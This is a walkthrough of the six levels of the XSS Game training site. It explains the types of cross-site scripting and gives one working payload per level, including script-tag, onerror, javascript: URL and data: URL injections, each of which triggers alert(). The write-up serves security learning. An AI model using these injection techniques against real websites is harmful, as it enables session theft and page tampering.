# XSS Game Appspot 

![image](https://user-images.githubusercontent.com/60937657/209459481-f9fa5664-0a05-4402-8f99-2abe37ffd64d.png)

Link of XSS GAME AREA - https://xss-game.appspot.com/

**Cross-Site Scripting (XSS)** is one of the most popular and vulnerable attacks which is known by every advanced tester. It is considered one of the riskiest attacks for web applications and can bring harmful consequences too.

XSS is often compared with similar client-side attacks, as client-side languages are mostly being used during this attack. However, an XSS attack is considered riskier, because of its ability to damage even less vulnerable technologies.

## Types of Cross Site Scripting Attacks

The prime purpose of performing an XSS attack is to steal another person’s identity. As mentioned, it may be cookies, session tokens, etc. XSS also may be used to display faked pages or forms for the victim. However, this attack can be performed in several ways.

This attack is divided into three main categories as shown below:

1) Reflected XSS – This attack occurs, when a malicious script is not being saved on the webserver but reflected in the website’s results.
2) Stored XSS – This attack occurs when a malicious script is being saved on the webserver permanently.
3) DOM – This occurs, when the DOM environment is being changed, but the code remains the same.


### Level 1 


![image](https://user-images.githubusercontent.com/60937657/209504143-554f58db-6d74-474b-b20f-9f6d1fd4fb8b.png)

```
<script>alert()</script>
```

![image](https://user-images.githubusercontent.com/60937657/209503948-bd3663c3-59d9-4516-a762-96af44f6294d.png)


### Level 2 


![image](https://user-images.githubusercontent.com/60937657/209503755-05c0d614-3dda-4dc7-b855-a42d5b9f4cee.png)

```
<img src="http://inexist.ent"
onerror="javascript:alert(1)"/>
```

![image](https://user-images.githubusercontent.com/60937657/209503869-0f536c23-f2a7-466c-bb0d-101e4a695477.png)


### Level 3 


![image](https://user-images.githubusercontent.com/60937657/209504304-c8f8484f-0c54-4673-a6d0-c403a0591670.png)

```
https://xss-game.appspot.com/level3/frame#1' onerror='alert(1)';
```

![image](https://user-images.githubusercontent.com/60937657/209508407-5e598764-ee7e-478e-a1f6-34245fc3cf76.png)


### Level 4 


![image](https://user-images.githubusercontent.com/60937657/209508468-2e519c5c-0e26-44a7-ad53-a39ff7e25a75.png)

```
timer=');alert('xss
```

![image](https://user-images.githubusercontent.com/60937657/209509468-678f2ef2-8aec-4e88-a381-c7f05e2ac147.png)


### Level 5 


![image](https://user-images.githubusercontent.com/60937657/209523525-15f14c6c-d4e3-4853-8089-57d5614cba2d.png)

Command to be inserted in browser URL section;
```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
```
Command to be inserted in email section;
```
signup?next=javascript:alert(1)
```

![image](https://user-images.githubusercontent.com/60937657/209523829-c4040efd-b95f-487d-a5de-41f4bac8f2fd.png)


### Level 6 


![image](https://user-images.githubusercontent.com/60937657/209524240-5d45e843-c4c8-432a-bb60-fe1f9a151db1.png)

```
https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
```

![image](https://user-images.githubusercontent.com/60937657/209524546-077771d4-2e74-4a4c-a1dc-e085f8452bd0.png)
